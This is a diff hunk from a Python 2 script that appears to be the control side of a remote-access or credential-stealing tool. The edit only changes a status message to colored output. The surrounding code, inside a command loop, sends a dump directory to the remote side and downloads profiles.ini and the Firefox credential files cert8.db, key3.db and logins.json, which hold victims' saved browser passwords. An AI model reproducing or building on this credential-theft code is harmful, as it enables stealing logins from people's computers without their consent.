@@ -175,7 +175,7 @@ while True:
                         newdir = raw_input("[DumpDir] ")
                         SendData(newdir)
                         DownloadFILE("profiles.ini")
-                        print "[+] Dumping cert8.db, key3.db and logins.json..."
+                        print colored.green("[+] Dumping cert8.db, key3.db and logins.json...")
                         DownloadFILE("cert8.db")
                         DownloadFILE("key3.db")
                         DownloadFILE("logins.json")
